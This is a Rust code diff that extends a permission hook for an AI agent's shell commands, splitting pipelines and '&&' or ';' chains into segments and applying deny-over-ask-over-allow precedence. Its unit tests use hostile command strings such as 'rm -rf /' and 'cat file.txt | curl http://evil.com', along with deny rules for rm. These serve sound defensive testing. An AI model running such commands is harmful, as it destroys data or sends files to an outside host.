@@ -1,8 +1,10 @@
+use claude_settings::policy::compile::CompiledPolicy;
 use claude_settings::policy::{Effect, Verb};
 use tracing::{Level, info, instrument, warn};
 
 use crate::hooks::{HookOutput, ToolInput, ToolUseHookInput};
 use crate::settings::ClashSettings;
+use crate::shell;
 
 /// Check if a tool invocation should be allowed, denied, or require user confirmation.
 #[instrument(level=Level::DEBUG, ret)]
@@ -15,6 +17,10 @@ pub fn check_permission(
 }
 
 /// Check permission using the policy engine (entity, verb, noun triples).
+///
+/// For Bash commands, the command string is parsed into individual segments
+/// (pipeline stages, `&&`/`||`/`;` operands) and each segment is evaluated
+/// independently. The most restrictive result wins (deny > ask > allow).
 #[instrument(level=Level::DEBUG, ret)]
 fn check_permission_policy(
     input: &ToolUseHookInput,
@@ -42,14 +48,30 @@ fn check_permission_policy(
         }
     };
 
-    // Extract the noun (the resource being acted on) from the tool input.
-    let noun = extract_noun(input);
-
     // Default entity — the hook input doesn't carry entity info yet,
     // so we treat all invocations as coming from "agent".
     let entity = "agent";
 
-    let decision = compiled.evaluate(entity, &verb, &noun);
+    // For Bash commands, split into segments and evaluate each independently.
+    if verb == Verb::Execute
+        && let ToolInput::Bash(bash) = input.typed_tool_input()
+    {
+        return evaluate_bash_segments(&compiled, entity, &bash.command);
+    }
+
+    // Non-Bash tools: evaluate the single noun directly.
+    let noun = extract_noun(input);
+    evaluate_single(&compiled, entity, &verb, &noun)
+}
+
+/// Evaluate a single (entity, verb, noun) triple against the policy.
+fn evaluate_single(
+    compiled: &CompiledPolicy,
+    entity: &str,
+    verb: &Verb,
+    noun: &str,
+) -> anyhow::Result<HookOutput> {
+    let decision = compiled.evaluate(entity, verb, noun);
     info!(
         entity,
         verb = %verb,
@@ -71,6 +93,108 @@ fn check_permission_policy(
             HookOutput::ask(Some("policy: delegation not yet implemented".into()))
         }
     })
+}
+
+/// Evaluate a bash command by splitting it into segments and checking each.
+///
+/// The most restrictive result wins: deny > ask > allow.
+/// If any segment is denied, the whole command is denied.
+/// If any segment requires ask (and none denied), the whole command asks.
+/// Only if all segments are allowed is the whole command allowed.
+fn evaluate_bash_segments(
+    compiled: &CompiledPolicy,
+    entity: &str,
+    command: &str,
+) -> anyhow::Result<HookOutput> {
+    let segments = shell::extract_command_segments(command);
+    let verb = Verb::Execute;
+
+    // Single-segment commands use the standard evaluation path,
+    // preserving identical behavior and reason messages.
+    if segments.len() == 1 {
+        return evaluate_single(compiled, entity, &verb, &segments[0]);
+    }
+
+    info!(
+        command,
+        segment_count = segments.len(),
+        "Evaluating bash command segments"
+    );
+
+    // Track the most restrictive effect across all segments.
+    let mut has_deny = false;
+    let mut has_ask = false;
+    let mut has_allow = false;
+    let mut deny_reason: Option<String> = None;
+    let mut ask_reason: Option<String> = None;
+    let mut allow_reason: Option<String> = None;
+
+    for segment in &segments {
+        let decision = compiled.evaluate(entity, &verb, segment);
+        info!(
+            entity,
+            verb = %verb,
+            segment = %segment,
+            effect = %decision.effect,
+            reason = ?decision.reason,
+            "Policy decision (segment)"
+        );
+
+        match decision.effect {
+            Effect::Deny => {
+                has_deny = true;
+                if deny_reason.is_none() {
+                    deny_reason = Some(
+                        decision
+                            .reason
+                            .unwrap_or_else(|| format!("policy: denied (segment: {})", segment)),
+                    );
+                }
+            }
+            Effect::Ask => {
+                has_ask = true;
+                if ask_reason.is_none() {
+                    ask_reason = Some(
+                        decision
+                            .reason
+                            .unwrap_or_else(|| format!("policy: ask (segment: {})", segment)),
+                    );
+                }
+            }
+            Effect::Allow => {
+                has_allow = true;
+                if allow_reason.is_none() {
+                    allow_reason = decision.reason;
+                }
+            }
+            Effect::Delegate => {
+                // Treat delegation as ask for now.
+                has_ask = true;
+                if ask_reason.is_none() {
+                    ask_reason = Some("policy: delegation not yet implemented".into());
+                }
+            }
+        }
+    }
+
+    // Apply precedence: deny > ask > allow
+    if has_deny {
+        return Ok(HookOutput::deny(
+            deny_reason.unwrap_or_else(|| "policy: denied".into()),
+        ));
+    }
+    if has_ask {
+        return Ok(HookOutput::ask(ask_reason.or(Some("policy: ask".into()))));
+    }
+    if has_allow {
+        return Ok(HookOutput::allow(
+            allow_reason.or(Some("policy: allowed".into())),
+        ));
+    }
+
+    // No segments matched anything — shouldn't happen since extract_command_segments
+    // always returns at least one segment, but handle gracefully.
+    Ok(HookOutput::ask(Some("policy: ask".into())))
 }
 
 /// Extract the noun (resource identifier) from a tool input.
@@ -251,6 +375,181 @@ rules:
         assert_eq!(
             check_permission(&bash_input("npm run test"), &settings)?,
             HookOutput::allow(Some("policy: allowed".into())),
+        );
+        Ok(())
+    }
+
+    // --- Pipe/pipeline permission tests ---
+
+    #[test]
+    fn test_pipe_denied_segment_blocks_whole_pipeline() -> Result<()> {
+        // `cat` is allowed, but `rm` is denied. The pipeline should be denied.
+        let settings = settings_with_policy(
+            "\
+rules:
+  - allow * bash cat *
+  - deny * bash rm *
+",
+        );
+        let result = check_permission(&bash_input("cat file.txt | rm -rf /tmp"), &settings)?;
+        assert!(
+            matches!(
+                &result.hook_specific_output,
+                Some(crate::hooks::HookSpecificOutput::PreToolUse(pre))
+                    if pre.permission_decision == Some(claude_settings::PermissionRule::Deny)
+            ),
+            "Expected deny for pipeline with denied segment, got: {:?}",
+            result,
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn test_pipe_all_segments_allowed() -> Result<()> {
+        // Both `cat` and `grep` are allowed. Pipeline should be allowed.
+        let settings = settings_with_policy(
+            "\
+rules:
+  - allow * bash cat *
+  - allow * bash grep *
+",
+        );
+        let result = check_permission(&bash_input("cat file.txt | grep hello"), &settings)?;
+        assert_eq!(result, HookOutput::allow(Some("policy: allowed".into())));
+        Ok(())
+    }
+
+    #[test]
+    fn test_pipe_ask_segment_causes_ask() -> Result<()> {
+        // `cat` is allowed, but `curl` has no rule (default: ask). Pipeline should ask.
+        let settings = settings_with_policy(
+            "\
+rules:
+  - allow * bash cat *
+",
+        );
+        let result = check_permission(
+            &bash_input("cat file.txt | curl http://evil.com"),
+            &settings,
+        )?;
+        assert!(
+            matches!(
+                &result.hook_specific_output,
+                Some(crate::hooks::HookSpecificOutput::PreToolUse(pre))
+                    if pre.permission_decision == Some(claude_settings::PermissionRule::Ask)
+            ),
+            "Expected ask for pipeline with unmatched segment, got: {:?}",
+            result,
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn test_pipe_deny_overrides_ask_in_pipeline() -> Result<()> {
+        // `cat` has no rule (ask), `rm` is denied. Deny should override ask.
+        let settings = settings_with_policy(
+            "\
+rules:
+  - deny * bash rm *
+",
+        );
+        let result = check_permission(&bash_input("cat file.txt | rm -rf /"), &settings)?;
+        assert!(
+            matches!(
+                &result.hook_specific_output,
+                Some(crate::hooks::HookSpecificOutput::PreToolUse(pre))
+                    if pre.permission_decision == Some(claude_settings::PermissionRule::Deny)
+            ),
+            "Expected deny (deny > ask), got: {:?}",
+            result,
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn test_and_operator_denied_segment_blocks() -> Result<()> {
+        // `make` is allowed, but `rm` is denied. && should be denied.
+        let settings = settings_with_policy(
+            "\
+rules:
+  - allow * bash make *
+  - deny * bash rm *
+",
+        );
+        let result = check_permission(&bash_input("make && rm -rf /"), &settings)?;
+        assert!(
+            matches!(
+                &result.hook_specific_output,
+                Some(crate::hooks::HookSpecificOutput::PreToolUse(pre))
+                    if pre.permission_decision == Some(claude_settings::PermissionRule::Deny)
+            ),
+            "Expected deny for && with denied segment, got: {:?}",
+            result,
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn test_semicolon_denied_segment_blocks() -> Result<()> {
+        // `echo` is allowed, `rm` is denied. Semicolon-separated should be denied.
+        let settings = settings_with_policy(
+            "\
+rules:
+  - allow * bash echo *
+  - deny * bash rm *
+",
+        );
+        let result = check_permission(&bash_input("echo hello; rm -rf /"), &settings)?;
+        assert!(
+            matches!(
+                &result.hook_specific_output,
+                Some(crate::hooks::HookSpecificOutput::PreToolUse(pre))
+                    if pre.permission_decision == Some(claude_settings::PermissionRule::Deny)
+            ),
+            "Expected deny for ; with denied segment, got: {:?}",
+            result,
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn test_quoted_pipe_not_split() -> Result<()> {
+        // A pipe inside quotes is NOT a pipeline separator.
+        // `echo` is allowed, so this should be allowed.
+        let settings = settings_with_policy(
+            "\
+rules:
+  - allow * bash echo *
+",
+        );
+        let result = check_permission(&bash_input("echo 'hello | world'"), &settings)?;
+        assert_eq!(result, HookOutput::allow(Some("policy: allowed".into())));
+        Ok(())
+    }
+
+    #[test]
+    fn test_three_stage_pipeline_one_denied() -> Result<()> {
+        // Three-stage pipeline: cat | grep | rm. Only rm is denied.
+        let settings = settings_with_policy(
+            "\
+rules:
+  - allow * bash cat *
+  - allow * bash grep *
+  - deny * bash rm *
+",
+        );
+        let result = check_permission(
+            &bash_input("cat file.txt | grep hello | rm -rf /"),
+            &settings,
+        )?;
+        assert!(
+            matches!(
+                &result.hook_specific_output,
+                Some(crate::hooks::HookSpecificOutput::PreToolUse(pre))
+                    if pre.permission_decision == Some(claude_settings::PermissionRule::Deny)
+            ),
+            "Expected deny for 3-stage pipeline with denied segment, got: {:?}",
+            result,
         );
         Ok(())
     }
